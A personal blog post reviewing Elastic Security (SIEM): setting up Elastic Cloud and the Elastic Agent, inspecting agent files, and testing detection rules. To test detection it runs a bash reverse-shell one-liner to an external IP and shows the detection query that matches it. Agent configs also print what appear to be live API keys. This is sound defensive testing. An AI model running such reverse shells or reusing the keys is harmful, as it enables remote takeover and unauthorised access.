# Elastic SIEM Review

Who doesn't know Elastic stack? Elasticsearch, logstash, kibana is almost the golden standard for DIY logging solution. They are free, scalable, and have good visualisation. Recently, they expand their games to Cyber Security field with their brand new SIEM solution (or now called [Elastic Security](https://www.elastic.co/security)). Are they good enough to be used for your organization? In this post, I will try out their features and give personal verdicts on their current state.

## Setting up the Environment

### Deploying the Elastic Stack

First, let's spin up an elastic stack. To avoid wasting time on setting up the stack deployment, I decided to spin up the cloud version on [https://cloud.elastic.co/](https://cloud.elastic.co/). Setting up is very easy, the UI is beautiful and the experience is good.

![](<../../.gitbook/assets/image (42).png>)

After clicking a few buttons, they will automatically setup our elastic cluster on the chosen cloud provider (in my case, I choose Google Cloud). They spin up 5 instances across cloud zone: 3 Elasticsearch instances, 2 Kibana instances.

![](<../../.gitbook/assets/image (27).png>)

Upon clicking the "Edit" menu on the sidebar, we will be faced with a beautiful page for configuring our deployments. There are many settings we can change.

* They allow us to modify the Elasticsearch instance size, starting from as low as `30 GB storage | 1 GB RAM | Up to 2.5 vCPU` in hot data tier to something as high as `3000 TB storage | 1.88 TB RAM | 240 vCPU` in frozen data tier. We can also set the availability zone for each configuration.
* In this page, we can also configure the hot / warm / cold / frozen Elasticsearch configuration.
* Not only Elasticsearch, we can also configure deployment for Kibana, APM (App performance monitoring), and Enterprise Search (we don't care).

The experience of managing deployment this easily always make me wonder why companies are still hiring many TechOps.

{% hint style="info" %}
Regarding data tier, usually people will separate their data into multiple tiers. Nodes in hot data-tier ingest and process frequently queried data, on the other hand, they want to maximize savings by archiving data on a frozen tier.
{% endhint %}

![](<../../.gitbook/assets/image (47).png>)

### Deploying the Agent Node

Before we can view any valuable information, we need to provide data sources to be ingested to the Elasticsearch. For Elastic Security, there are 2 options: using traditional **Beats** (e.g. Filebeat, metricbeat) or using their beta **Elastic Agent**. For the sake of living-on-the-edge, I decided to use the elastic agent.

I deploy a virtual machine using virtualbox with 2 vCPU and 500GB RAM (which I regret later, since it's too small and freeze a lot!)

```ruby
Vagrant.configure("2") do |config|
    config.vm.define "agent-01" do |c|
        c.vm.box = "ubuntu/bionic64"
        c.vm.hostname = "agent-01"
        c.vm.provider "virtualbox" do |v|
            v.memory = 512
        end
    end
end
```

## Trying out the Elastic SIEM

> Elastic Security integrates the free and open Elastic SIEM with Endpoint Security to prevent, detect, and respond to threats. To begin, you’ll need to add security solution related data to the Elastic Stack.

Let's open our Kibana and select **Elastic Security** on the sidebar. Upon opening the Elastic Security page, it's still empty and we are required to add security-related data. There are 3 options: (1) Elastic Agent, (2) Beats, (3) Endpoint Security; which somehow misleading since the "Endpoint Security" is one of the many Elastic Agent integration. So in the end, you only have 2 choices: Beats or Elastic Agent.

![](<../../.gitbook/assets/image (44).png>)

Clicking the Add data with Elastic Agent will redirect us to the tutorial page that provide step-by-step guides to enroll a server using their agent. One more thing to note is **Fleet**. Using Fleet, we can centrally manage the configuration of elastic agents, which seems to be the obvious choice if we want to easily manage agents at scale.

![](<../../.gitbook/assets/image (34).png>)

## Quick Look on Elastic Agent

{% hint style="info" %}
The Elastic Agent provides a simple, unified way to add monitoring for logs, metrics, and other types of data to your hosts. You no longer need to install multiple Beats and other agents, which makes it easier and faster to deploy policies across your infrastructure. For more information, read our [announcement blog post](https://ela.st/ingest-manager-announcement)
{% endhint %}

Installing Elastic Agent in our virtual machine is very simple, with several CLI commands:

```
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-7.13.0-linux-x86_64.tar.gz
tar xzvf elastic-agent-7.13.0-linux-x86_64.tar.gz
cd elastic-agent-7.13.0-linux-x86_64
sudo ./elastic-agent install -f --url=<fleet_server_url> --enrollment-token=<enrollment_token>
```

After installation, there are several things added:

1. We now have `elastic-agent` in our PATH.
2. Added a systemd service unit `/etc/systemd/system/elastic-agent.service`
3. Added directory `/opt/Elastic/Agent`.

```
root@agent-01:/# elastic-agent -h

Usage:
  elastic-agent [subcommand] [flags]
  elastic-agent [command]

Available Commands:
  enroll      Enroll the Agent into Fleet
  help        Help about any command
  inspect     Shows configuration of the agent
  install     Install Elastic Agent permanently on this system
  restart     Restart the currently running Elastic Agent daemon
  run         Start the elastic-agent.
  status      Status returns the current status of the running Elastic Agent daemon.
  uninstall   Uninstall permanent Elastic Agent from this system
  upgrade     Upgrade the currently running Elastic Agent to the specified version
  version     Display the version of the elastic-agent.
  watch       Watch watches Elastic Agent for failures and initiates rollback.

Flags:
  -c, --c string                     Configuration file, relative to path.config (default "elastic-agent.yml")
  -d, --d string                     Enable certain debug selectors
  -e, --e                            Log to stderr and disable syslog/file output
      --environment environmentVar   set environment being ran in (default default)
  -h, --help                         help for elastic-agent
      --path.config string           Config path is the directory Agent looks for its config file (default "/opt/Elastic/Agent")
      --path.home string             Agent root path (default "/opt/Elastic/Agent")
      --path.logs string             Logs path contains Agent log output (default "/opt/Elastic/Agent")
  -v, --v                            Log at INFO level

Use "elastic-agent [command] --help" for more information about a command.
```

```
root@agent-01:/proc/1022# cat /etc/systemd/system/elastic-agent.service
[Unit]
Description=Elastic Agent is a unified agent to observe, monitor and protect your system.
ConditionFileIsExecutable=/usr/bin/elastic-agent

[Service]
StartLimitInterval=5
StartLimitBurst=10
ExecStart=/usr/bin/elastic-agent
WorkingDirectory=/opt/Elastic/Agent
Restart=always
RestartSec=120
EnvironmentFile=-/etc/sysconfig/elastic-agent

[Install]
WantedBy=multi-user.target
```

After installation, we can see that a directory appear on `/opt/Elastic/Agent`. This directory contains all the necessary files for the standalone Elastic Agent to run.

```
root@agent-01:/opt/Elastic/Agent# tree -L 2
.
├── LICENSE.txt
├── NOTICE.txt
├── README.md
├── data
│   ├── agent.lock
│   ├── elastic-agent-054e22
│   └── tmp
├── elastic-agent -> data/elastic-agent-054e22/elastic-agent
├── elastic-agent-20210601100041
├── elastic-agent.reference.yml
├── elastic-agent.yml
├── elastic-agent.yml.2021-06-01T10-00-41.4274.bak
├── fleet.yml
└── fleet.yml.lock

3 directories, 11 files
```

On the root of the directory, it contains the agent configuration `elastic-agent.yml` and `fleet.yml`. In our case, since we enable fleet, the `elastic-agent.yml` only contains information that fleet is enabled (their config is managed centrally by fleet). The `fleet.yml` contains the information of the agent and the fleet credentials.

{% code title="elastic-agent.yml" %}
```yaml
fleet:
  enabled: true
```
{% endcode %}

{% code title="fleet.yml" %}
```yaml
agent:
  id: a9d563d7-ef96-498e-8842-e7efd522ee7a
  logging.level: info
  monitoring.http:
    enabled: false
    host: ""
    port: 6791
fleet:
  enabled: true
  access_api_key: WFB3RXgza0JkS1RtTXJteHEtNFQ6eWQ1NlkxbENRaXlNVzdmYkdaZ01TQQ==
  protocol: http
  host: 384be2a909fd4dc6afdf54c3dd187a0a.fleet.asia-southeast1.gcp.elastic-cloud.com:443
  hosts:
  - <https://384be2a909fd4dc6afdf54c3dd187a0a.fleet.asia-southeast1.gcp.elastic-cloud.com:443>
  timeout: 10m0s
  reporting:
    threshold: 10000
    check_frequency_sec: 30
  agent:
    id: ""
```
{% endcode %}

Next, inside `data` directory, it contains the current `elastic-agent` software running, which is `elastic-agent-054e22`. The `elastic-agent` executable at root path is symlink-ed to the executable in this directory.

We can also see that Elastic Agent uses portable softwares contained only within the directory. In `downloads`, we can see the downloaded tar archives. In `install`, we can see the portable `filebeat` and `metricbeat` software files.

```
root@agent-01:/opt/Elastic/Agent/data/elastic-agent-054e22# tree . -L 2
.
├── downloads
│   ├── apm-server-7.13.0-linux-x86_64.tar.gz
│   ├── apm-server-7.13.0-linux-x86_64.tar.gz.asc
│   ├── apm-server-7.13.0-linux-x86_64.tar.gz.sha512
│   ├── endpoint-security-7.13.0-linux-x86_64.tar.gz
│   ├── endpoint-security-7.13.0-linux-x86_64.tar.gz.asc
│   ├── endpoint-security-7.13.0-linux-x86_64.tar.gz.sha512
│   ├── filebeat-7.13.0-linux-x86_64.tar.gz
│   ├── filebeat-7.13.0-linux-x86_64.tar.gz.asc
│   ├── filebeat-7.13.0-linux-x86_64.tar.gz.sha512
│   ├── fleet-server-7.13.0-linux-x86_64.tar.gz
│   ├── fleet-server-7.13.0-linux-x86_64.tar.gz.asc
│   ├── fleet-server-7.13.0-linux-x86_64.tar.gz.sha512
│   ├── heartbeat-7.13.0-linux-x86_64.tar.gz
│   ├── heartbeat-7.13.0-linux-x86_64.tar.gz.asc
│   ├── heartbeat-7.13.0-linux-x86_64.tar.gz.sha512
│   ├── metricbeat-7.13.0-linux-x86_64.tar.gz
│   ├── metricbeat-7.13.0-linux-x86_64.tar.gz.asc
│   └── metricbeat-7.13.0-linux-x86_64.tar.gz.sha512
├── elastic-agent
├── install
│   ├── filebeat-7.13.0-linux-x86_64
│   └── metricbeat-7.13.0-linux-x86_64
├── logs
│   ├── default
│   ├── elastic-agent-json.log-20210601100040
│   └── elastic-agent-json.log-20210601100041
├── run
│   └── default
└── state.yml
```

```
root@agent-01:/opt/Elastic/Agent/data/elastic-agent-054e22# tree install/ -L 2
install/
├── filebeat-7.13.0-linux-x86_64
│   ├── LICENSE.txt
│   ├── NOTICE.txt
│   ├── README.md
│   ├── fields.yml
│   ├── filebeat
│   ├── filebeat.reference.yml
│   ├── filebeat.yml
│   ├── kibana
│   ├── module
│   └── modules.d
└── metricbeat-7.13.0-linux-x86_64
    ├── LICENSE.txt
    ├── NOTICE.txt
    ├── README.md
    ├── fields.yml
    ├── kibana
    ├── metricbeat
    ├── metricbeat.reference.yml
    ├── metricbeat.yml
    ├── module
    └── modules.d
```

In the `data/elastic-agent-054e22/state.yml`, we can see the configuration from the Fleet.

{% code title="state.yml" %}
```yaml
action:
  action_id: policy:ecf33e60-c2b7-11eb-ab3c-d5c2ff2a71c3:2:1
  action_type: POLICY_CHANGE
  policy:
    # ...
    fleet:
      hosts:
      - https://xxx.fleet.asia-southeast1.gcp.elastic-cloud.com:443
    id: ecf33e60-c2b7-11eb-ab3c-d5c2ff2a71c3
    inputs:
    # ...
    - data_stream:
        namespace: default
      id: 0abaf67a-c3a0-4f0b-80c2-3effcac15d73
      meta:
        package:
          name: auditd
          version: 0.1.1
      name: auditd-1
      revision: 1
      streams:
      - data_stream:
          dataset: auditd.log
          type: logs
        exclude_files:
        - .gz$
        id: logfile-auditd.log-0abaf67a-c3a0-4f0b-80c2-3effcac15d73
        paths:
        - /var/log/audit/audit.log*
        processors:
        - add_fields:
            fields:
              ecs.version: 1.9.0
            target: ""
      type: logfile
      use_output: default
    # ... more
    outputs:
      default:
        api_key: XfwEx3kBdKTmMrmxvO4c:5p7xzh_DQ42-VcaKuEBeLQ
        hosts:
        - https://xxx.asia-southeast1.gcp.elastic-cloud.com:443
        type: elasticsearch
    revision: 2
```
{% endcode %}

I enabled the `auditd` integration beforehand, so we can see that the `auditd` logs are collected as `inputs` in our agent policy. However, I see that `auditd` process is not running in my agent, which means that Elastic Agent does not concern itself in making sure that auditd is running. In my case, I need to run `apt install auditd` so this log exists: `/var/log/audit/audit.log`

Our agent visualised in the Kibana dashboard:

![](<../../.gitbook/assets/image (43).png>)

Note that in the dashboard, there are 2 actions available: **unenroll**, and **assign new policy.** Policy basically defines what configuration we want to apply to our agents. In our case, we apply `Default` policy to our agent-01.

Next, let's see what processes are running in our agent.

```
root@agent-01:/opt/Elastic/Agent# service elastic-agent status
● elastic-agent.service - Elastic Agent is a unified agent to observe, monitor and protect your system.
   Loaded: loaded (/etc/systemd/system/elastic-agent.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2021-06-01 10:53:56 UTC; 2h 7min ago
 Main PID: 785 (elastic-agent)
    Tasks: 49 (limit: 546)
   CGroup: /system.slice/elastic-agent.service
           ├─ 785 /opt/Elastic/Agent/elastic-agent
           ├─1178 /opt/Elastic/Agent/data/elastic-agent-054e22/install/filebeat-7.13.0-linux-x86_64/filebeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.mode=x-pack-fleet -E m
           ├─1265 /opt/Elastic/Agent/data/elastic-agent-054e22/install/metricbeat-7.13.0-linux-x86_64/metricbeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.mode=x-pack-fleet
           ├─1343 /opt/Elastic/Agent/data/elastic-agent-054e22/install/filebeat-7.13.0-linux-x86_64/filebeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.mode=x-pack-fleet -E m
           └─1390 /opt/Elastic/Agent/data/elastic-agent-054e22/install/metricbeat-7.13.0-linux-x86_64/metricbeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.mode=x-pack-fleet
```

We see 5 processes: elastic-agent, filebeat, metricbeat, filebeat-monitor, metricbeat-monitor.

## Enabling the Elastic Security Endpoint

When I am exploring the Elastic Security Dashboard, an (ads?) popup appears which ask me a question whether to enable a feature named **Security Endpoints**. Why not? I decided to test this feature. After following several forms to fill, the system replaced (or upgraded?) my agent from **Elastic Agent** to **Elastic Endpoints.** I'm not very sure about the process.

![](<../../.gitbook/assets/image (30).png>)

However, I noticed that command `elastic-agent` are no longer working in my agent.

```
root@agent-01:/# elastic-agent
/usr/bin/elastic-agent: 2: exec: /opt/Elastic/Agent/elastic-agent: not found

root@agent-01:/# ls -l /opt/Elastic/Agent
total 8464
-rw-r--r-- 1 root root   13675 Jun  1 10:00 LICENSE.txt
-rw-r--r-- 1 root root 8576604 Jun  1 10:00 NOTICE.txt
-rw-r--r-- 1 root root     863 Jun  1 10:00 README.md
drwxrwxr-x 4 root root    4096 Jun  1 10:00 data
-rw------- 1 root root   11397 Jun  1 10:53 elastic-agent-20210601100041
-rw------- 1 root root     139 Jun  1 10:51 elastic-agent-20210601105117
-rw------- 1 root root     139 Jun  1 10:51 elastic-agent-20210601105149
-rw------- 1 root root   10419 Jun  1 13:06 elastic-agent-20210601105357
-rw-r--r-- 1 root root    9020 Jun  1 10:00 elastic-agent.reference.yml
-rw------- 1 root root    1946 Jun  1 10:00 elastic-agent.yml
-rw------- 1 root root    9017 Jun  1 10:00 elastic-agent.yml.2021-06-01T10-00-41.4274.bak
-rw------- 1 root root     547 Jun  1 10:00 fleet.yml
-rw------- 1 root root       0 Jun  1 10:00 fleet.yml.lock
```

I am not sure whether this is intentional or not. But I suspect this is not intentional, since this means the elastic-agent systemd service should fail when we restart the agent _**(which later I experience this to be the case, so disappointing!).**_

After installing the _Endpoint Security_ integration, we found that our agent are sending additional events as shown below. Most of them are _Process_ events. The rest are _File_ events. These events collection can be configured from the dashboard. In case of Linux and Mac, only **File**, **Process**, and **Network** will be collected; the rest (such as Registry) are exclusive to Windows only.

![](<../../.gitbook/assets/image (39).png>)

In Windows and Mac, we can enable something called _**Malware Protection**_. Additionally, we can enable _**Ransomware Protection**_ _in Windows._

Now with these additional data sources, we are able to view **Uncommon Process** in the _Hosts_ page. Not very useful for detecting intrusion, but at least it's working. How does this work?

![](<../../.gitbook/assets/image (32).png>)

Note that these uncommon processes will not appear in **Detection** tab, since by default there is no rules to match this list. I suppose this list of _Uncommon processes_ are only for additional information when inspecting a host, basically they are query logs and do some aggregation and filtering.

## Testing the Detection feature

One of the main feature of SIEM is its ability to generate alerts when malicious things happen. Let's test out the detection feature of this Elastic Security!

### Let's try spawning reverse shell <a href="#84d8dc1c-84ff-41df-8ef0-cf27bf7e6419" id="84d8dc1c-84ff-41df-8ef0-cf27bf7e6419"></a>

Using this payload: `bash -i >& /dev/tcp/157.230.255.84/1337 0>&1`. After executing this command, we didn't see any alerts. We are able to see our bash exec process in the event list, but it didn't trigger any alert, which is disappointing.

![](<../../.gitbook/assets/image (36).png>)

The process event also trigger another _network_ event `network start` with destination of our evil server. So sad that this does not generate alert.

![](<../../.gitbook/assets/image (31).png>)

### Activating the Detection Rule <a href="#5be28dc5-2c0b-4e6a-985d-5f4635f4493f" id="5be28dc5-2c0b-4e6a-985d-5f4635f4493f"></a>

After being disappointed, I realised that I haven't activated any detection rules. So is this my fault? maybe, but I also blame them for not notifying me that I need to manually activate the detection rules beforehand!

OK enough complaining, so I try activating some Detection Rule, such as "**Potential Reverse Shell Activity via Terminal**".

![](<../../.gitbook/assets/image (37).png>)

We can see that this rule will query the index `auditbeat-*` and `logs-endpoint.events.*` with the following query:

```
process where event.type in ("start", "process_started") and
  process.name in ("sh", "bash", "zsh", "dash", "zmodload") and
  process.args:("*/dev/tcp/*", "*/dev/udp/*", "zsh/net/tcp", "zsh/net/udp")
```

From quick glimpse on this query, our previous commands should be matched. _Let's see..._

After activating this rules, I wait for around 5 minutes, but no alerts are generated. I understood that the rule is set to be run every several minutes. However when I check in the dashboard, the rule said that it is already _succeeded_ running with the last run is _58 seconds ago_, leading me to another disappointment... If it's already running then why there is no alerts generated!?

![](<../../.gitbook/assets/image (41).png>)

After re-checking the generated events, my reverse shell process is not detected because the `process.args` value is only `bash,-i`. _What?_

![](<../../.gitbook/assets/image (40).png>)

Let's modify the detection rule a bit by adding matching `-i` in `process.args`, who really use the `-i` flag for a legitimate action anyway? But _alas_, we cannot modify the prebuilt rule, so let's just create a new one.

![](<../../.gitbook/assets/image (45).png>)

The form to create a new rule looks very good. We can run `Preview results` to quickly test our query. In the screenshot above, we can see that it match 14 events, which seems correct. Then, we need to define the rule name, description, severity and risk score. We can also define MITRE ATT\&CK™ reference, which is nice for further analysis. Then, we can set how often this rules running (e.g. every 1 minute), and what action to be taken if threats detected (e.g. send email or webhook, though this is limited only for paid license).

After I activate this newly created rules, I wait for another 5 minutes. But still, there are no no alerts generated...

When I recheck, the rule is by default set to run every 5 minutes with additional 4 minutes look-back time. Because of this, our new rule did not generate any alerts (our past reverse shell are more than 10 minutes ago). We weren't sure if there is any way for backfilling, which is quite disappointing (again!).

### Alerts are finally Generated

So I execute our reverse shell payload once again, and finally be happy to see alerts generated. It took around 5 minutes from our payload execution until the alerts generated.

![](<../../.gitbook/assets/image (38).png>)

I must admit that their UI is gorgeous, we can open _analyzer_ to view related events and track process generation. For example, from this graph, we can easily see that this reverse shell is coming from a user logged in via `sshd`

![](<../../.gitbook/assets/image (28).png>)

Elastic also provide additional features for incident investigation, namely _timeline_ (allow us to build timeline by querying some logs) and _case_ (allow management to track this issue and connect it to other management system such as Jira).

![](<../../.gitbook/assets/image (35).png>)

### Agent Resource Consumption <a href="#18cb770a-091d-4576-821e-c697be24628a" id="18cb770a-091d-4576-821e-c697be24628a"></a>

We tested this agent on a 500MB RAM virtual machine running in virtualbox. During testing, we see that our agent's RAM is always on almost maximum usage, most of them are eaten up by `elastic-endpoint`, `filebeat`, and `metricbeat` processes. As for CPU, by average around 2% of 2 vCPU is used.

### Anomaly Detection using ML <a href="#cc93b45c-7c58-4227-aafd-c4acd72c2290" id="cc93b45c-7c58-4227-aafd-c4acd72c2290"></a>

Inside the Detections tab, there is a button that allow us to run several ML Jobs. Unfortunately, our we don't have any ML nodes to run those jobs in our Free trial. From a quick glance, this feature utilise the [anomaly detection feature in Elastic](https://www.elastic.co/what-is/elasticsearch-machine-learning). I think this feature is not very useful unless you have a very big log data and got a scalability issue: manual analysis has become out of hand. BTW, this feature is only available if have the paid license.

![](<../../.gitbook/assets/image (46).png>)



## TODO: This post is WIP
